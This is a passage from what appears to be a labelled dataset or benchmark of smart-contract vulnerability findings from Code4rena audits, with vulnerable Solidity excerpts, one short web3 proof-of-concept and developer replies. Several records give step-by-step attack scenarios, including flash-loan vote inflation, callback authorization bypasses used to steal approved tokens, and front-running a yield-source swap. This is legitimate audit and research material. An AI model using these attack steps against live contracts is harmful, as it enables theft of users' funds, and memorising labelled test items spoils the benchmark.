link_synth.functions.balanceOf(user).call()\\nbase.functions.transfer(link_pool.address, sparta_amount).transact({\\n'from'\\n: user})\\nlink_pool.functions.mintSynth(link_synth.address, user).transact({\\n'from'\\n: user})\\nafter_link_synth = link_synth.functions.balanceOf(user).call()\\nprint\\n(\\n'get link synth amount from link pool:'\\n, after_link_synth - initail_link_synth)\\nsparta_amount =\\n100\\n*\\n10\\n**\\n18\\ninitail_link_synth = link_synth.functions.balanceOf(user).call()\\nbase.functions.transfer(dai_pool.address, sparta_amount).transact({\\n'from'\\n: user})\\ndai_pool.functions.mintSynth(link_synth.address, user).transact({\\n'from'\\n: user})\\nafter_link_synth = link_synth.functions.balanceOf(user).call()\\nprint\\n(\\n'get link synth amount from dai pool:'\\n, after_link_synth - initail_link_synth)\",\n      \"get\\nlink\\nsynth\\namount\\nfrom\\nlink\\npool:\\n97078046905036524413\\nget\\nlink\\nsynth\\namount\\nfrom\\ndai\\npool:\\n970780469050365244136\",\n      \"require\\n(\\niSYNTH\\n(\\nsynthOut\\n).\\nLayerONE\\n() ==\\nTOKEN\\n,\\n\\\"invalid synth\\\"\\n);\"\n    ],\n    \"quotes\": [\n      \"We agree and appreciate this finding being valid high risk issue.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 39,\n    \"bug_id\": \" H-13\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Flash loan manipulation on getPoolShareWeight of Utils\\\"\",\n    \"line\": \"Dao[201,570], DaoVault[44], Utils[46,70]\",\n    \"url\": \" https://code4rena.com/reports/2021-07-spartan#h-13-flash-loan-manipulation-on-getpoolshareweight-of-utils\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by shw\",\n      \"ThegetPoolShareWeightfunction returns a user‚Äôs pool share weight by calculating how many SPARTAN the user‚Äôs LP tokens account for. However, this approach is vulnerable to flash loan manipulation since an attacker can swap a large number of TOKEN to SPARTAN to increase the number of SPARTAN in the pool, thus effectively increasing his pool share weight.\",\n      \"According to the implementation ofgetPoolShareWeight,a user‚Äôs pool share weight is calculated byuints * baseAmount / totalSupply, whereuintsis the number of user‚Äôs LP tokens,totalSupplyis the total supply of LP tokens, andbaseAmountis the number of SPARTAN in the pool. Thus, a user‚Äôs pool share weight is proportional to the number of SPARTAN in the pool. Consider the following attack scenario:\",\n      \"Supposing the attacked pool is SPARTAN-WBNB. The attacker first prepares some LP tokens (WBNB-SPP) by adding liquidity to the pool.\",\n      \"The attacker then swaps a large number of WBNB to SPARTAN, which increases the pool‚ÄôsbaseAmount. He could split his trade into small amounts to reduce slip-based fees.\",\n      \"The attacker now wants to increase his weight in theDaoVault. He adds his LP tokens to the pool by calling thedepositfunction ofDao.\",\n      \"Daothen callsdepositLPofDaoVault, causing the attacker‚Äôs weight to be recalculated. Due to the large proportion of SPARTAN in the pool, the attacker‚Äôs weight is artificially increased.\",\n      \"With a higher member weight, the attacker can, for example, vote the current proposal with more votes than he should have or obtain more rewards when callingharvestof theDaocontract.\",\n      \"The attacker then swaps back SPARTAN to WBNB and only loses the slip-based fees.\",\n      \"Referenced code:Utils.sol#L46-L50,Utils.sol#L70-L77,DaoVault.sol#L44-L56,Dao.sol#L201, andDao.sol#L570.\",\n      \"A possible mitigation is to record the current timestamp when a user‚Äôs weight in theDaoVaultorBondVaultis recalculated and force the new weight to take effect only after a certain period, e.g., a block time. This would prevent the attacker from launching the attack since there is typically no guarantee that he could arbitrage the WBNB back in the next block.\",\n      \"SamusElderg (Spartan) confirmed and disagreed with severity:\",\n      \"ghoul-sol (judge) commented:\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 40,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S2-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"2 variables not indexed by marketIndex\\\"\",\n    \"line\": \"Staker[622]\",\n    \"url\": \" https://code4rena.com/reports/2021-08-floatcapital#h-02-2-variables-not-indexed-by-marketindex\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by gpersoon\",\n      \"In the token contract:batched_stakerNextTokenShiftIndexis indexed bymarketIndex, so it can have separate (or the same) values for each differentmarketIndex.\",\n      \"stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mappingandstakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mappingare not indexed bymarketIndex.\\nSo the values ofstakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mappingandstakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mappingcan be overwritten by a different market, ifbatched_stakerNextTokenShiftIndex[market1]==batched_stakerNextTokenShiftIndex[market2]\",\n      \"This will lead to weird results in_calculateAccumulatedFloat, allocating too much or too little float.\",\n      \"Staker.solL622\",\n      \"Recommend adding an index withmarketIndexto the variables:\",\n      \"stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping\",\n      \"stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping\",\n      \"Also consider shortening the variable names, this way mistakes can be spotted easier.\",\n      \"Confirmed by Jason of Float Capital: Yes, you are totally right, it should use themarketIndexsince they are specific per market!\",\n      \"JasoonS (Float) confirmed:\"\n    ],\n    \"code_blocks\": [\n      \"function\\npushUpdatedMarketPricesToUpdateFloatIssuanceCalculations\\n(\\n...\\nstakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping\\n[\\nbatched_stakerNextTokenShiftIndex\\n[\\nmarketIndex\\n]  ] =\\nstakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mappingIfShiftExecuted\\n;\\nstakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping\\n[\\nbatched_stakerNextTokenShiftIndex\\n[\\nmarketIndex\\n]  ] =\\nlatestRewardIndex\\n[\\nmarketIndex\\n] +\\n1\\n;\\nbatched_stakerNextTokenShiftIndex\\n[\\nmarketIndex\\n] +=\\n1\\n;\\n...\\n)\"\n    ],\n    \"quotes\": [\"Embarrassed by this one!Thank you for the report.Fixed!!\"],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 41,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Access restrictions on CompoundToNotionalV2.notionalCallback can be bypassed\\\"\",\n    \"line\": \" CompoundToNotionalV2[58,73]\",\n    \"url\": \" https://code4rena.com/reports/2021-08-notional#h-04-access-restrictions-on-compoundtonotionalv2notionalcallback-can-be-bypassed\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheCompoundToNotionalV2.notionalCallbackis supposed to only be called from the verified contract that calls this callback. But, the access restrictions can be circumvented by simply providingsender = this, assenderis a parameter of the function that can be chosen by the attacker.\",\n      \"An attacker can call the function passing in an arbitraryaccountwhose tokens are then transferred to the contract.\\nTheaccountfirst has to approve this contract but this can happen with accounts that legitimately want to call the outer function and have to send a first transaction to approve the contract, but then an attacker front-runs the actual transaction.\",\n      \"It‚Äôs at least a griefing attack:\\nI can pass in a maliciouscTokenBorrowthat returns any token of my choice (through the.underlying()call) but whoserepayBorrowBehalfis a no-op.\",\n      \"This will lead to any of the victim‚Äôs approved tokens becoming stuck in the contract, essentially burning them:\",\n      \"Note that the assumption at the end of the function ‚Äù// When this exits a free collateral check will be triggered‚Äù is not correct anymore but I couldn‚Äôt find a way to make use of it to lead to an invalid account state.\",\n      \"Recommend fixing the authorization check.\",\n      \"jeffywu (Notional) confirmed\"\n    ],\n    \"code_blocks\": [\n      \"function\\nnotionalCallback\\n(\\naddress\\nsender\\n,\\naddress\\naccount\\n,\\nbytes\\ncalldata\\ncallbackData\\n)\\nexternal\\nreturns\\n(\\nuint256\\n) {\\n// @audit sender can be passed in by the attacker\\nrequire\\n(\\nsender\\n==\\naddress\\n(\\nthis\\n),\\n\\\"Unauthorized callback\\\"\\n);\",\n      \"// @audit using a malicious contract, this can be any token\\naddress\\nunderlyingToken\\n=\\nCTokenInterface\\n(\\ncTokenBorrow\\n).\\nunderlying\\n();\\nbool\\nsuccess\\n=\\nIERC20\\n(\\nunderlyingToken\\n).\\ntransferFrom\\n(\\naccount\\n,\\naddress\\n(\\nthis\\n),\\ncTokenRepayAmount\\n);\\nrequire\\n(\\nsuccess\\n,\\n\\\"Transfer of repayment failed\\\"\\n);\\n// Use the amount transferred to repay the borrow\\n// @audit using a malicious contract, this can be a no-op\\nuint\\ncode\\n=\\nCErc20Interface\\n(\\ncTokenBorrow\\n).\\nrepayBorrowBehalf\\n(\\naccount\\n,\\ncTokenRepayAmount\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 42,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Access restrictions on NotionalV1ToNotionalV2.notionalCallback can be bypassed\\\"\",\n    \"line\": \" NotionalV1ToNotionalV2[144]\",\n    \"url\": \" https://code4rena.com/reports/2021-08-notional#h-05-access-restrictions-on-notionalv1tonotionalv2notionalcallback-can-be-bypassed\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by pauliax\",\n      \"TheNotionalV1ToNotionalV2.notionalCallbackis supposed to only be called from the verified contract that calls this callback but the access restrictions can be circumvented by simply providingsender = thisassenderis a parameter of the function that can be chosen by the attacker.\",\n      \"An attacker can call the function passing in an arbitraryaccountwhose tokens can then be stolen.\\nTheaccountfirst has to approve this contract but this can happen with accounts that legitimately want to migrate their tokens and therefore have to send a first transaction to approve the contract, but then an attacker frontruns the actual migration transaction.\",\n      \"The attacker can steal the tokens by performing an attack similar to the following:\",\n      \"first transaction is used to withdraw the victim‚Äôs funds to the contract. This can be done by choosingaccount=victim,v1RepayAmount=0,v1CollateralId=WBTC,v2CollateralId=DAI. TheNotionalV1Erc1155.batchOperationWithdraw(not part of this contest) will withdraw the victim‚Äôs funds to this contract. Note that the attacker has to deposit the samev2CollateralBalance = uint256(collateralBalance)for the victim into the V2 version, but they can choose different cheaper collateral (for example, withdraw WBTC, deposit same amount of DAI).\",\n      \"second transaction is now used to deposit the victim funds in the contract into the user‚Äôs account. They useaccount=attacker,v1DebtCurrencyId=WBTC,v1RepayAmount=amountto deposit it into Notional V1. (They need to have a smallcollateralBalance, etc. to pass all checks).\",\n      \"Recommend fixing the authorization check.\"\n    ],\n    \"code_blocks\": [\n      \"function\\nnotionalCallback\\n(\\naddress\\nsender\\n,\\naddress\\naccount\\n,\\nbytes\\ncalldata\\ncallbackData\\n)\\nexternal\\nreturns\\n(\\nuint256\\n) {\\nrequire\\n(\\nsender\\n==\\naddress\\n(\\nthis\\n),\\n\\\"Unauthorized callback\\\"\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 43,\n    \"bug_id\": \" H-10\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Liquidity token value can be manipulated\\\"\",\n    \"line\": \"AssetHandler[107,114,120,151]\",\n    \"url\": \" https://code4rena.com/reports/2021-08-notional#h-10-liquidity-token-value-can-be-manipulated\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"The liquidity token value (AssetHandler.getLiquidityTokenValue) is the sum of the value of the individual claims on cash (underlying or rather cTokens) and fCash.\\nThe amount to redeem on each of these is computed as the LP token to redeem relative to the total LP tokens, seeAssetHandler.getCashClaims/AssetHandler.getHaircutCashClaims:\",\n      \"This means the value depends on thecurrent market reserveswhich can be manipulated.\\nYou‚Äôre essentially computing a spot price (even though the individual values use a TWAP price) because you use the current market reserves which can be manipulated.\",\n      \"See the ‚ÄúHow do I tell if I‚Äôm using spot price?‚Äù sectionhere.\",\n      \"The value of an LP token is computed asassetCashClaim + assetRate.convertFromUnderlying( presentValue(fCashClaim) ), where(assetCashClaim, fCashClaim)depends on the current market reserves which can be manipulated by an attacker via flashloans.\\nTherefore, an attacker trading large amounts in the market can either increase or decrease the value of an LP token.\",\n      \"If the value decreases, they can try to liquidate users borrowing against their LP tokens / nTokens.\\nIf the value increases, they can borrow against it and potentially receive an under-collateralized borrow this way, making a profit.\",\n      \"The exact profitability of such an attack depends on the AMM as the initial reserve manipulation and restoring the reserves later incurs fees and slippage.\\nIn constant-product AMMs like Uniswap it‚Äôs profitable and several projects have already been exploited by this, likewarp.finance.\\nHowever, Notional Finance uses a more complicated AMM and the contest was too short for me to do a more thorough analysis. It seems like a similar attack could be possible here as described by the developers when talking about a different context of using TWAP oracles:\",\n      \"Recommend not using the current market reserves to determine the value of LP tokens. Also, think about how to implement a TWAP oracle for the LP tokens themselves, instead of combining it from the two TWAPs of the claimables.\",\n      \"T-Woodward (Notional) confirmed and disagreed with severity:\",\n      \"ghoul-sol (judge) commented:\"\n    ],\n    \"code_blocks\": [\n      \"// @audit token.notional are the LP tokens to redeem\\nassetCash\\n=\\nmarket\\n.\\ntotalAssetCash\\n.\\nmul\\n(\\ntoken\\n.\\nnotional\\n).\\ndiv\\n(\\nmarket\\n.\\ntotalLiquidity\\n);\\nfCash\\n=\\nmarket\\n.\\ntotalfCash\\n.\\nmul\\n(\\ntoken\\n.\\nnotional\\n).\\ndiv\\n(\\nmarket\\n.\\ntotalLiquidity\\n);\"\n    ],\n    \"quotes\": [\n      \"However, by doing this you‚Äôre actually incorporating the spot price because you‚Äôre still dependent on the reserve balances of the pool. This is an extremely subtle detail, and more than one project has been caught by it. You can read more about thisfootgunin this writeup by @cmichelio.\",\n      \"‚ÄúOracle rate protects against short term price manipulation. Time window will be set to a value on the order of minutes to hours. This is to protect fCash valuations from market manipulation. For example, a trader could use a flash loan to dump a large amount of cash into the market and depress interest rates. Since we value fCash in portfolios based on these rates, portfolio values will decrease and they may then be liquidated.‚Äù - Market.sol L424\",\n      \"It is true that a flash loan could be used to manipulate the value of a liquidity token‚Äôs cash and fCash claims. This issue can potentially cause accounts to be liquidated which shouldn‚Äôt be, but not for the reasons stated in this issue. I‚Äôll explain what actually can go wrong, and why the fix is simple and non-invasive.First, to restate the issue: The manipulator could borrow or lend a large amount to a liquidity pool, which would change the amount of cash and fCash sitting in that pool and the corresponding cash and fCash claims of a liquidity token associated with that pool. This could change the liquidity token‚Äôs net value within the space of a transaction despite the fact that the oracleRate used to value fCash is lagged and manipulation resistant.But it is not true that this manipulation could decrease the value of a liquidity token - in fact it could only increase a liquidity token‚Äôs value. By borrowing or lending a large amount using a flash loan, the interest rate that the attacker would receive would deviate from the oracleRate in favor of the liquidity provider. If the attacker executed a large lend order, the interest rate on the loan would be significantly below the oracleRate. This would mean that the liquidity providers had borrowed at a below-market rate and that the net value of that trade would be positive for them. Conversely if the attacker executed a large borrow order, the interest rate on the loan would be significantly above the oracleRate. Again, this would mean that the net value of that trade would be positive for the liquidity providers because they would effectively be lending at an above-market rate. In either case, the value of the liquidity token would increase, not decrease.However, even though the value of a liquidity token could only increase during such an attack, the collateral value of the liquidity token could decrease once the haircuts were applied in the free collateral calculation. The reason for this is that fCash claims are effectively double-haircut (once by the liquidity token haircut and once by the fCash haircut), whereas cash claims are only haircut once (by the liquidity token haircut). This means that even though the attack would increase the value of the liquidity token without haircuts, once you consider the haircuts applied in the free collateral calculation, the collateral value of the liquidity token can be decreased and accounts could become undercollateralized and eligible for liquidation.Remediation:The immediate remediation for this issue is to restrict providing liquidity to the nToken account exclusively. In the longer term, we will plan to add TWAPs to determine the collateral value of liquidity token cash and fCash claims. This immediate remediation will be fine for now though, and will not degrade the system for two reasons:The team does not anticipate users providing liquidity directly outside of the nToken (we don‚Äôt even offer a way to do it within the UI for example). Only nToken holders receive NOTE incentives, not direct liquidity providers.The nToken accounts are safe from this attack because the maximum amount that an attacker could temporarily decrease the collateral value of liquidity tokens could never be enough to cause the nToken accounts to become undercollateralized, and therefore they would never be at risk of liquidation due to this attack. The TLDR here is that this attack can‚Äôt actually decrease the collateral value of liquidity tokens all that much, and so for an account to be vulnerable they would have to be running quite close to minimum collateralization. This will never happen for the nToken because it doesn‚Äôt borrow, it just provides liquidity and always maintains very healthy collateralization levels.\",\n      \"Again, I gave it some thought and I think that this is high risk. Keeping as is.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 44,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"setYieldSource leads to temporary wrong results\\\"\",\n    \"line\": \"SwappableYieldSource[148,167,186,208,225,254,268]\",\n    \"url\": \" https://code4rena.com/reports/2021-07-pooltogether#h-03-setyieldsource-leads-to-temporary-wrong-results\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by gpersoon\",\n      \"The use ofsetYieldSourceleaves the contract in a temporary inconsistent state because it changes the underlying yield source,\\nbut doesn‚Äôt (yet) transfer the underlying balances, while the shares stay the same.\",\n      \"The functionbalanceOfTokenwill show the wrong results, because it is based on_sharesToToken, which usesyieldSource.balanceOfToken(address(this)), that isn‚Äôt updated yet.\",\n      \"More importantlysupplyTokenTowill give the wrong amount of shares back:\\nFirst it supplies tokens to theyieldsource.\\nThen is calls_mintShares, which calls_tokenToShares, which calculates the shares, usingyieldSource.balanceOfToken(address(this))ThisyieldSource.balanceOfToken(address(this))only contains the just supplied tokens, but doesn‚Äôt include the tokens from the previousYieldSource.\\nSo the wrong amount of shares is given back to the user; they will be given more shares than appropriate which means they can drain funds later on (oncetransferFundshas been done).\",\n      \"It is possible to make use of this problem in the following way:\",\n      \"monitor the blockchain until you seesetYieldSourcehas been done\",\n      \"immediately call the functionsupplyTokenTo(which can be called because there is no access control on this function)\",\n      \"Reocommend removing the functionsetYieldSource(e.g. only leaveswapYieldSource)\\nOr temporally disable actions likesupplyTokenTo,redeemTokenand balanceOfToken, aftersetYieldSourceand untiltransferFundshas been done.\",\n      \"PierrickGT (PoolTogether) confirmed and resolved:\"\n    ],\n    \"code_blocks\": [\n      \"// https://github.com/pooltogether/swappable-yield-source/blob/main/contracts/SwappableYieldSource.sol\\nfunction\\nsetYieldSource\\n(\\nIYieldSource\\n_newYieldSource\\n)\\nexternal\\n`\\nonlyOwnerOrAssetManager\\n`\\nreturns\\n(\\nbool\\n) {\\n_setYieldSource\\n(\\n_newYieldSource\\n);\\nfunction\\n_setYieldSource\\n(\\nIYieldSource\\n_newYieldSource\\n)\\ninternal\\n{\\n..\\nyieldSource\\n=\\n_newYieldSource\\n;\\nfunction\\nsupplyTokenTo\\n(\\nuint256\\namount\\n,\\naddress\\nto\\n)\\nexternal\\noverride\\nnonReentrant\\n{\\n..\\nyieldSource\\n.\\nsupplyTokenTo\\n(\\namount\\n,\\naddress\\n(\\nthis\\n));\\n_mintShares\\n(\\namount\\n,\\nto\\n);\\n}\\nfunction\\n_mintShares\\n(\\nuint256\\nmintAmount\\n,\\naddress\\nto\\n)\\ninternal\\n{\\nuint256\\nshares\\n=\\n`_tokenToShares`\\n(\\nmintAmount\\n);\\nrequire\\n(\\nshares\\n>\\n0\\n,\\n\\\"SwappableYieldSource/shares-gt-zero\\\"\\n);\\n_mint\\n(\\nto\\n,\\nshares\\n);\\n}\\nfunction\\n_tokenToShares\\n(\\nuint256\\ntokens\\n)\\ninternal\\nreturns\\n(\\nuint256\\n) {\\nuint256\\nshares\\n;\\nuint256\\n_totalSupply\\n=\\ntotalSupply\\n();\\n..\\nuint256\\nexchangeMantissa\\n=\\nFixedPoint\\n.\\ncalculateMantissa\\n(\\n_totalSupply\\n,\\nyieldSource\\n.\\nbalanceOfToken\\n(\\naddress\\n(\\nthis\\n)));\\n// based on incomplete yieldSource.balanceOfToken(address(this))\\nshares\\n=\\nFixedPoint\\n.\\nmultiplyUintByMantissa\\n(\\ntokens\\n,\\nexchangeMantissa\\n);\\nfunction\\nbalanceOfToken\\n(\\naddress\\naddr\\n)\\nexternal\\noverride\\nreturns\\n(\\nuint256\\n) {\\nreturn\\n_sharesToToken\\n(\\nbalanceOf\\n(\\naddr\\n));\\n}\\nfunction\\n_sharesToToken\\n(\\nuint256\\nshares\\n)\\ninternal\\nreturns\\n(\\nuint256\\n) {\\nuint256\\ntokens\\n;\\nuint256\\n_totalSupply\\n=\\ntotalSupply\\n();\\n..\\nuint256\\nexchangeMantissa\\n=\\nFixedPoint\\n.\\ncalculateMantissa\\n(\\nyieldSource\\n.\\nbalanceOfToken\\n(\\naddress\\n(\\nthis\\n)),\\n_totalSupply\\n);\\n// based on incomplete yieldSource.balanceOfToken(address(this))\\ntokens\\n=\\nFixedPoint\\n.\\nmultiplyUintByMantissa\\n(\\nshares\\n,\\nexchangeMantissa\\n);\"\n    ],\n    \"quotes\": [\n      \"PR:https://github.com/pooltogether/swappable-yield-source/pull/4We‚Äôve mitigated this issue by removing thetransferFundsandsetYieldSourceexternal functions and makingswapYieldSourcecallable only by the owner that will be a multi sig wallet for governance pools.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 45,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"CompositeMultiOracle returns wrong decimals for prices?\\\"\",\n    \"line\": \"CompositeMultiOracle[115,125]\",\n    \"url\": \" https://code4rena.com/reports/2021-08-yield#h-01-compositemultioracle-returns-wrong-decimals-for-prices\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheCompositeMultiOracle.peek/getfunctions seem to return wrong prices.\\nIt‚Äôs unclear what decimalssource.decimalsrefers to in this case. Does it refer tosource.sourcetoken decimals?\",\n      \"It chains the price arguments through_peekfunction calls and a single price is computed as:\",\n      \"Assume all oracles use 18 decimals (oracle.decimals()returns 18) andsource.decimalsrefers to thetoken decimalsofsource.source.\",\n      \"Then going fromUSDC -> DAI -> USDT(path = [DAI]) starts with a price of1e18inpeek:\",\n      \"_peek(USDC, DAI, 1e18): Gets the price of1e6 USDC(as USDC has 6 decimals) in DAI with 18 decimals precision (because all oracle precision is set to 18):priceOut = priceIn * 1e18 / 1e6 = 1e18 * 1e18 / 1e6 = 1e30\",\n      \"_peek(DAI, USDT, 1e30): Gets the price of1e18 DAI(DAI has 18 decimals) with 18 decimals precision:priceOut = priceIn * 1e18 / 1e18 = priceIn = 1e30\",\n      \"It then uses1e30as the price to go fromUSDCtoUSDT:value = price * amount / 1e18 = 1e30 * (1.0 USDC) / 1e18 = 1e30 * 1e6 / 1e18 = 1e18 = 1e12 * 1e6 = 1_000_000_000_000.0 USDT. Inflating the actualUSDTamount.\",\n      \"The issue is thatpeekassumes that the final price is in 18 decimals in thevalue = price * amount / 1e18division by1e18.\\nBut_peek(and_get) don‚Äôt enforce this.\",\n      \"Recommend that_peekshould scale the prices to1e18by doing:\",\n      \"It does not need to divide by thesource.sourcetoken precision(source.decimals), but by the oracle precision (IOracle(source.source).decimals()).\",\n      \"alcueca (Yield) acknowledged:\",\n      \"alcueca (Yield) patched:\",\n      \"alcueca (Yield) further patched:\"\n    ],\n    \"code_blocks\": [\n      \"(\\npriceOut\\n,\\nupdateTimeOut\\n) =\\nIOracle\\n(\\nsource\\n.\\nsource\\n).\\npeek\\n(\\nbase\\n,\\nquote\\n,\\n10\\n**\\nsource\\n.\\ndecimals\\n);\\n// Get price for one unit\\n// @audit shouldn't this divide by 10 ** IOracle(source.source).decimals() instead?\\npriceOut\\n=\\npriceIn\\n*\\npriceOut\\n/ (\\n10\\n**\\nsource\\n.\\ndecimals\\n);\",\n      \"(\\npriceOut\\n,\\nupdateTimeOut\\n) =\\nIOracle\\n(\\nsource\\n.\\nsource\\n).\\nget\\n(\\nbase\\n,\\nquote\\n,\\n10\\n**\\nsource\\n.\\ndecimals\\n);\\n// priceOut will have same decimals as priceIn if we divide by oracle decimals\\npriceOut\\n=\\npriceIn\\n*\\npriceOut\\n/ (\\n10\\n**\\nIOracle\\n(\\nsource\\n.\\nsource\\n).\\ndecimals\\n());\"\n    ],\n    \"quotes\": [\n      \"It‚Äôs confusing to deal with all these decimals, I should at least comment the code better, and try to make it easier to understand.It‚Äôs unclear what decimals source.decimals refers to in this case. Does it refer to source.source token decimals?CompositeMultiOracle takes IOracle contracts as sources, sosource.decimalsrefers to the token decimals of the oracle, not of the data source one level below.It does not need to divide by the source.source token precision (source.decimals), but by the oracle precision (IOracle(source.source).decimals()).The source.source token precision would beIChainlinkAggregatorV3(source.source()).decimals(), the source oracle precision issource.decimals(). CompositeMultiOracle cannot make an assumption on any fields present onsource.source, and must  work only with the underlyingsourceIOracles.I‚Äôm still not disputing this finding. I need to dig further to make sure the decimals are right when different IOracle sources have different decimals, and I‚Äôve hardcoded a few1e18in there. Those are code smells.\",\n      \"Sent me into a wild goose chase to support IOracle of multiple decimals as sources to CompositeMultiOracle, only to realize that we create all IOracles and we always create them with 18 decimals, converting from the underlying data source if needed.Ended up making CompositeMultiOracle require that underlying oracles have 18 decimals.Done.\",\n      \"Furtherrefactored all oracles so that decimals are handled properly, and work on taking an amount of base as input, and returning an amount of quote as output. Our oracles don‚Äôt have decimals themselves anymore as a state variable, since the return values are in the decimals of quote. This means that CompositeMultiOracle is agnostic with regards to decimals, and doesn‚Äôt even need to know about them.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 46,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"ERC20Rewards returns wrong rewards if no tokens initially exist\\\"\",\n    \"line\": \"ERC20Rewards[102]\",\n    \"url\": \" https://code4rena.com/reports/2021-08-yield#h-02-erc20rewards-returns-wrong-rewards-if-no-tokens-initially-exist\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheERC20Rewards._updateRewardsPerTokenfunction exits without updatingrewardsPerToken_.lastUpdatediftotalSupplyis zero, i.e., if there are no tokens initially.\",\n      \"This leads to an error if there is an active rewards period but no tokens have been minted yet.\",\n      \"Example:rewardsPeriod.start: 1 month ago,rewardsPeriod.end: in 1 month,totalSupply == 0.\",\n      \"The first mint leads to the user (mintee) receiving all rewards for the past period (50% of the total rewards in this case).\",\n      \"_mintis called, calls_updateRewardsPerTokenwhich short-circuits.rewardsPerToken.lastUpdatedis still set torewardsPeriod.startfrom the constructor. Then_updateUserRewardsis called and does not currently yield any rewards. (because both balance and the index diff are zero). User has now minted the tokens,totalSupplyincreases and user balance is set.\",\n      \"User performs aclaim:_updateRewardsPerTokenis called andtimeSinceLastUpdated = end - rewardsPerToken_.lastUpdated = block.timestamp - rewardsPeriod.start = 1 month. Contract ‚Äúissues‚Äù rewards for the past month. The first mintee receives all of it.\",\n      \"The first mintee receives all pending rewards when they should not receive any past rewards.\\nThis can easily happen if the token is new, the reward period has already been initialized and is running, but the protocol has not officially launched yet.\\nNote thatsetRewardsalso allows setting a date in the past which would also be fatal in this case.\",\n      \"Recommend that therewardsPerToken_.lastUpdatedfield must always be updated in_updateRewardsPerTokento the current time (orend) even if_totalSupply == 0. Don‚Äôt return early.\",\n      \"alcueca (Yield) confirmed:\",\n      \"alcueca (Yield) patched:\"\n    ],\n    \"code_blocks\": [\n      \"function\\nrewardPerToken\\n()\\npublic\\nview\\nreturns\\n(\\nuint256\\n) {\\nif\\n(\\ntotalSupply\\n() ==\\n0\\n) {\\nreturn\\nrewardPerTokenStored\\n;\\n}\"\n    ],\n    \"quotes\": [\n      \"You are right, that‚Äôs a great finding. For the record, I think that this is whatthis line in Unipool.soldoes:\",\n      \"I‚Äôll apply the mitigation step suggested, with a conditional to not do therewardsPerToken_.accumulatedmath that would revert.Now I know the feeling of the devs that fork a known project and leave a pesky conditional out, thanks again :D\",\n      \"Fix\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 47,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"ERC20Rewards breaks when setting a different token\\\"\",\n    \"line\": \"ERC20Rewards[74]\",\n    \"url\": \" https://code4rena.com/reports/2021-08-yield#h-03-erc20rewards-breaks-when-setting-a-different-token\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"ThesetRewardsfunction allows setting a different token.\\nHolders of a previous reward period cannot all be paid out and will receivetheir old reward amountin the new token.\",\n      \"This leads to issues when the new token is more (less) valuable, or uses different decimals.\",\n      \"Example:Assume the first reward period paid out inDAIwhich has 18 decimals. Someone would have received1.0 DAI = 1e18 DAIif they calledclaimnow. Instead, they wait until the new period starts withUSDC(using only 6 decimals) and canclaimtheir1e18reward amount in USDC which would equal1e12 USDC, one trillion USD.\",\n      \"Changing the reward token only works if old and new tokens use the same decimals and have the exact same value. Otherwise, users that claim too late/early will lose out.\",\n      \"Recommend disallowing changing the reward token, or clearing user‚Äôs pending rewards of the old token. The second approach requires more code changes and keeping track of what token a user last claimed.\",\n      \"alcueca (Yield) confirmed:\",\n      \"alcueca (Yield) patched:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Maybe I should have used stronger language:// If changed in a new rewards program, any unclaimed rewards from the last one will be served in the new tokenThe issue is known, but you are right in pointing it out. There are few situations in which changing the rewards token would make sense (such as replacing a faulty rewards token by a fixed one). I think it would be best to just disallow changing the 